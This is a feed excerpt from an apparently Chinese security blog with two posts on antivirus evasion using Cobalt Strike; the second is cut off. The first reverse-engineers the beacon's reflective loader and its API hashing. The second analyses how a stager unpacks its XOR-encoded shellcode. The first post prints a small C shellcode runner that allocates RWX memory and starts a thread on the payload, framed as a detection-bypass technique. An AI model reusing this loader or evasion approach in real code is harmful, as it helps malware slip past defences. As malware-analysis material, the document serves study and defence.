    <updated>2025-06-23T03:27:39.275Z</updated>
    
    <content type="html"><![CDATA[<p>可能是最简单一种免杀方式了</p><p>对于自己开发c2有启发意义</p><p>公众号：<a href="https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg">https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg</a></p><span id="more"></span><p>在上一篇文章：<a href="https://joe1sn.eu.org/2025/02/28/cs-external/">【免杀】使用CobaltStrike的外置监听器绕过检测</a></p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/A6k7mR4gGVQgfbWlz9iblQIJT9D97QJRSAUJ622uWbibKkRpBdwgm6a2cZTaS3oqxIQ7FatHN6Opspwibib4wA3HhQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="Image" /></p><p>我们实现了一个能通过external C2 来对杀软进行绕过的方法，那么为什么行呢？这里对通讯的流量进行分析。</p><p>首先是在<code>spawnBeacon</code>需要运行一段teamserver发送过来的shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spawnBeacon</span><span class="params">(<span class="type">char</span> *payload, DWORD len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line">    DWORD threadId = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *alloc = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(alloc, payload, len);</span><br><span class="line"></span><br><span class="line">    threadHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)alloc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IDA中下断点看看，这里的客户端是自己编译的，因此选择Debug模式，这样IDA能通过pdb文件实现源码级F5（其实也不算反编译）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616091600947.png" alt="image-20250616091600947" /></p><p>看看这段汇编长啥样</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616091918917.png" alt="image-20250616091918917" /></p><p>第一个<code>call rbx</code>翻译成C</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616092037845.png" alt="image-20250616092037845" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616092116204.png" alt="image-20250616092116204" /></p><p>这里从第三方客户端Dump下文件后查看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616133516232.png" alt="image-20250616133516232" /><br /><code>findPEFile</code></p><p>首先获得当前rsp的值，并且由于是小端序，应该从右向左读。从启示地址开始读取，直到读取到PE文件的DOS头的e_magic，接着再判断PE头，如果都成立，则返回DOS文件头的地址，所以我在上层函数中将返回的类型设置为了<code>PIMAGE_DOS_HEAD</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616133638968.png" alt="image-20250616133638968" /></p><h1 id="part-i-sub_180017948"><a class="markdownIt-Anchor" href="#part-i-sub_180017948"></a> Part I. sub_180017948</h1><p>在使用IDA打开Dump下来的bin文件时，IDA会将其默认解析为PE文件格式，说明这就是在反射式加载一个PE文件，所以要首先从LDR中加载出基本函数，例如<code>LoadLibrary</code>、<code>VirtualAlloc</code>等</p><p>首先是经典的<code>InMemoryOrderModuleList</code>循环遍历寻找</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616133813226.png" alt="image-20250616133813226" /></p><p>这个循环看不懂，我把<code>i</code>的类型设置为<code>struct _LDR_DATA_TABLE_ENTRY *i</code>再来看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616141121731.png" alt="image-20250616141121731" /></p><ul><li><p><code>__ROR4__</code>：将v8向右循环移动13位，使用这个作为单次循环读取到字符的哈希运算</p></li><li><p>break的条件是：<code>v8 == 0x6A4ABC5B</code></p></li></ul><p>既然是哈希，这个过程肯定是不可逆的，所以动态调试一下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616142523963.png" alt="image-20250616142523963" /></p><p>发现值为：<code>KERNEL32.DLL</code>可以得到该哈希，注意这里字串是<code>wchar_t*</code>的宽字符类型，需要在 Options-&gt;String Literals 选择编码方式为unicode</p><p>尝试使用python暴力破解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror4</span>(<span class="params">value: <span class="built_in">int</span>, bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    value &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 保证是32位</span></span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; bits) | (value &lt;&lt; (<span class="number">32</span> - bits))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hasher</span>(<span class="params">filename: <span class="built_in">bytes</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    v8 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> filename:</span><br><span class="line">        v9 = ror4(v8, <span class="number">13</span>)</span><br><span class="line">        v8 = (v9 + <span class="built_in">ord</span>(ch)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v9 = ror4(v8, <span class="number">13</span>)</span><br><span class="line">        v8 = (v9 + <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> v8</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    folder_path = <span class="string">&quot;C:\\Windows\\System32&quot;</span></span><br><span class="line">    files = os.listdir(folder_path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span>(file[-<span class="number">4</span>:]!=<span class="string">&quot;.dll&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">hash</span> = hasher(file.upper())</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">hash</span>==<span class="number">0x6A4ABC5B</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found&quot;</span>, file, <span class="string">&quot;hash is right: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">hash</span>).upper())</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616150157229.png" alt="image-20250616150157229" /></p><p>这里使用的是<code>C:\\Windows\\System32</code>目录下的DLL文件名<br />接着在静态我已经仅我最大努力了，可是还有很多不懂得</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616152712591.png" alt="image-20250616152712591" /></p><p>不过按照一般的流程就是找需要的导出函数了，动态调试看看</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616152822754.png" alt="image-20250616152822754" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616152848249.png" alt="image-20250616152848249" /></p><p>那么大概意思清楚了：读取dll的导出函数，进行自定义的哈希运算，找到符合的函数，从而加载函数，及<code>GetProcAddress</code>的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  v6 = *v14++ + __ROR4__(v6, <span class="number">13</span>);</span><br><span class="line"><span class="keyword">while</span> ( *v14 );</span><br></pre></td></tr></table></figure><p>知道了是kernel32.dll的函数，我们自己测试看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror4</span>(<span class="params">value: <span class="built_in">int</span>, bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    value &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 保证是32位</span></span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; bits) | (value &lt;&lt; (<span class="number">32</span> - bits))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hasher</span>(<span class="params">filename: <span class="built_in">bytes</span>, wide_char: <span class="built_in">bool</span> = <span class="literal">True</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    v8 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> filename:</span><br><span class="line">        v9 = ror4(v8, <span class="number">13</span>)</span><br><span class="line">        v8 = (v9 + <span class="built_in">ord</span>(ch)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span>(wide_char):</span><br><span class="line">            v9 = ror4(v8, <span class="number">13</span>)</span><br><span class="line">            v8 = (v9 + <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_exported_functions</span>(<span class="params">pe_path:<span class="built_in">str</span></span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">    result = []</span><br><span class="line">    pe = pefile.PE(pe_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;此文件没有导出表。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">        name = exp.name.decode() <span class="keyword">if</span> exp.name <span class="keyword">else</span> <span class="string">&quot;&lt;no name&gt;&quot;</span></span><br><span class="line">        address = <span class="built_in">hex</span>(pe.OPTIONAL_HEADER.ImageBase + exp.address)</span><br><span class="line">        ordinal = exp.ordinal</span><br><span class="line">        result.append(name)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    folder_path = <span class="string">&quot;C:\\Windows\\System32&quot;</span></span><br><span class="line">    files = os.listdir(folder_path)</span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span>(file[-<span class="number">4</span>:]!=<span class="string">&quot;.dll&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">hash</span> = hasher(file.upper())</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">hash</span>==<span class="number">0x6A4ABC5B</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found&quot;</span>, file, <span class="string">&quot;hash is right: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">hash</span>).upper())</span><br><span class="line">            filename = file</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filename != <span class="string">&quot;&quot;</span>):</span><br><span class="line">        filepath = os.path.join(folder_path, filename)</span><br><span class="line">        func_names = list_exported_functions(filepath)</span><br><span class="line">        val = hasher(func_names[<span class="number">0</span>], <span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(func_names[<span class="number">0</span>], <span class="built_in">hex</span>(val))    </span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616153834357.png" alt="image-20250616153834357" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616153853663.png" alt="image-20250616153853663" /></p><p>修改一下一小段脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(filename != <span class="string">&quot;&quot;</span>):</span><br><span class="line">    filepath = os.path.join(folder_path, filename)</span><br><span class="line">    func_names = list_exported_functions(filepath)    </span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> func_names:</span><br><span class="line">        v6 = hasher(name, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0xEC0E4E8E</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.2&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0x7C0DFCAA</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.1&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0x91AFCA54</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.4&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0x7946C61B</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.5&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0x753A4FC</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.3&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> v6 == <span class="number">0xD3324904</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.0&quot;</span>,name,<span class="string">&quot;\t&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;v6:02X&#125;</span>&quot;</span>) </span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250616154515629.png" alt="image-20250616154515629" /></p><p>最后函数完成的v13</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616154751622.png" alt="image-20250616154751622" /></p><p>关于如何实现<code>GetProcAddress</code>，可以参考之前关注发的文章：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">PE文件格式解析</a> 的 《如何找到导入的函数和DLL-导入表》部分</p><h2 id="sub_180017d38"><a class="markdownIt-Anchor" href="#sub_180017d38"></a> sub_180017D38</h2><p>主函数<code>ReflectiveLoader</code>检查完成后进入<code>sub_180017D38</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616155144742.png" alt="image-20250616155144742" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616155218101.png" alt="image-20250616155218101" /></p><p>根据之前的分析</p><ul><li><p><code>*a</code>函数就是<code>GetModuleHandlerA</code>，可以获得当前PE文件在内存中的位置</p></li><li><p><code>a[1]</code>函数就是<code>GetProcAddress</code></p></li></ul><h2 id="sub_180017f88"><a class="markdownIt-Anchor" href="#sub_180017f88"></a> sub_180017F88</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616160045897.png" alt="image-20250616160045897" /></p><p><code>ntHead-&gt;FileHeader.Characteristics</code>描述了IMAGE的特征。其中0x8000：反转单词的字节数。 此标志已过时。</p><p>根据参数修改下<code>sub_180017F88</code>的类型就很好看了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616160125821.png" alt="image-20250616160125821" /></p><p>动态调试发现没有走上面的复杂逻辑，或许是为了兼容性？</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616160912620.png" alt="image-20250616160912620" /></p><p>等效运行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, SizeofImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br></pre></td></tr></table></figure><h1 id="后续函数"><a class="markdownIt-Anchor" href="#后续函数"></a> 后续函数</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616164740424.png" alt="image-20250616164740424" /></p><p>基本就是反射式载入那一套，你依旧可以参考：<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>最后跳转到<code>LoaderFlags</code>或者<code>AddressOfEntryPoint</code>，这里是dllmain，开始运行恶意DLL</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616171420620.png" alt="image-20250616171420620" /></p><h2 id="sub_180018158-copydosheader"><a class="markdownIt-Anchor" href="#sub_180018158-copydosheader"></a> sub_180018158 CopyDOSHeader</h2><p>复制PE文件DOS头</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616161931065.png" alt="image-20250616161931065" /></p><h2 id="sub_180018218-reflectsections"><a class="markdownIt-Anchor" href="#sub_180018218-reflectsections"></a> sub_180018218 ReflectSections</h2><p>加载PE文件的Section到内存</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616162323421.png" alt="image-20250616162323421" /></p><h2 id="sub_180018318-getimporttable"><a class="markdownIt-Anchor" href="#sub_180018318-getimporttable"></a> sub_180018318 GetImportTable</h2><p>从导入表开始导入相关函数和Dll</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616163329837.png" alt="image-20250616163329837" /></p><h2 id="sub_1800185d8-dorelocation"><a class="markdownIt-Anchor" href="#sub_1800185d8-dorelocation"></a> sub_1800185D8 DoRelocation</h2><p>读取重定位表，进行重定位</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250616164133455.png" alt="image-20250616164133455" /></p><h1 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h1><p>继续升入下去可以挖掘出cobaltstrike功能实现的方法和技巧。</p><p>这种方式的有效shellcode仅有跳转到<code>ReflectLoader</code>之前的一小段汇编代码，所以看上“比较合法”，这样也大大提升了躲避检测的能力</p><p>同时这种方式可以使用之前提到过的反射式加载器加，不过需要自己维持一个ipc（名称一定要正确）和socket来负责传递数据</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;可能是最简单一种免杀方式了&lt;/p&gt;
&lt;p&gt;对于自己开发c2有启发意义&lt;/p&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg&quot;&gt;https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】Cobaltstrike Stager Payload分析</title>
    <link href="https://joe1sn.eu.org/2025/06/08/cs-stager-payload-1/"/>
    <id>https://joe1sn.eu.org/2025/06/08/cs-stager-payload-1/</id>
    <published>2025-06-08T15:45:15.000Z</published>
    <updated>2025-06-08T15:47:15.487Z</updated>
    
    <content type="html"><![CDATA[<p>cobaltstrike的payload主要分为Stager和Stageless</p><ul><li>Stager：分阶段式上线，从teamserver下载真正的payload后执行，体积小</li><li>Stageless：部分阶段上线，真正的payload直接在其中，适合用于红队测试中的免杀制作，体积大</li></ul><p>公众号：<a href="https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ">https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="stager-exe-payload分析"><a class="markdownIt-Anchor" href="#stager-exe-payload分析"></a> Stager Exe Payload分析</h1><p>软件版本：Teamserver 4.9.1</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528075956842.png" alt="image-20250528075956842" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528075620725.png" alt="image-20250528075620725" /></p><p>Payloads-&gt;Windows Stager Payload，具体配置如下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528080113726.png" alt="image-20250528080113726" /></p><h2 id="ida-分析"><a class="markdownIt-Anchor" href="#ida-分析"></a> IDA 分析</h2><p>入口点位于：4014C0</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528080513395.png" alt="image-20250528080513395" /></p><p><strong>sub_401990</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528081509897.png" alt="image-20250528081509897" /></p><p>利用时间等信息异或获得两个随机数：<code>randomA_4044D0</code>和<code>randomB_4044E0</code>，且二者<code>&amp;</code>为<code>0xFFFFFFFFFFFF</code></p><p><strong>sub_401180</strong></p><p>一些初始化的操作，和主要功能关系不大</p><p><strong>sub_403040</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528085711344.png" alt="image-20250528085711344" /></p><p>真正释放payload的地方</p><p><strong>sub_4017F8</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528090021917.png" alt="image-20250528090021917" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528090705443.png" alt="image-20250528090705443" /></p><p>这里模仿了windows中的管道的命名方式，并在后续的<code>sub_4016E6</code>创建该管道</p><p><strong>sub_4016E6 -&gt; sub_401630</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528090836327.png" alt="image-20250528090836327" /></p><p>创建了命名管道后写入一些内容后关闭管道</p><p>查看调用发现向管道写入 <code>lpBuffer_</code>的<code>0x37D</code>字节</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528091202941.png" alt="image-20250528091202941" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528091151364.png" alt="image-20250528091151364" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528091456690.png" alt="image-20250528091456690" /></p><p>shift+e先保存<code>lpBuffer_</code>方便后续分析</p><p><strong>sub_4017A6</strong></p><p>在创建线程冰箱管道写入过后进入该函数</p><ul><li><p><strong>sub_401704</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528091709972.png" alt="image-20250528091709972" /></p><p>从命名管道读取<code>0x37D</code>到申请的<code>lpBuffer</code></p></li><li><p><strong>sub_401595</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528092045154.png" alt="image-20250528092045154" /></p><p>经典的运行shellcode片段，调用如下<code>sub_401595(lpBuffer, nNumberOfBytesToWrite, &amp;unk_404028);</code>。对刚才从管道中读出的数据进行了异或来还原，异或的key为<code>unk_404028</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528091952230.png" alt="image-20250528091952230" /></p></li></ul><p>编写还原脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cipher = <span class="string">b&quot;&quot;</span></span><br><span class="line">    keys = [<span class="number">0xC2</span>, <span class="number">0xF0</span>, <span class="number">0xA1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lpBuffer_.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> srcFile:</span><br><span class="line">        cipher=srcFile.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypted_shellcode.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> dstFile:</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">            dstFile.write((c ^ keys[counter % <span class="number">3</span>]).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">            counter += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>唯一一个需要注意的地方就是C语言是固定数据类型的，所以使用<code>&amp;</code>可以达到和<code>%</code>一样的效果，只不过**<code>&amp;3</code>等效于<code>%4</code>**。python中的数据是不固定的，所以使用&amp;可能由于数据长度导致数字错误从而<code>index out of range</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528093442739.png" alt="image-20250528093442739" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528093021815.png" alt="image-20250528093021815" /></p><p>到这里观察我们还原出来的shellcode</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528093453071.png" alt="image-20250528093453071" /></p><p>如果我们对于相同的payload和listener生成shellcode</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528093604448.png" alt="image-20250528093604448" /></p><p>发现惊人的相似，主要不同</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528094308195.png" alt="image-20250528094308195" /></p><p>得出结论：<strong>CobaltStrike 的 Stager Excute生成的artifact.exe是在运行Stager Shellcode</strong></p><p><strong>sub_401563</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528094713540.png" alt="image-20250528094713540" 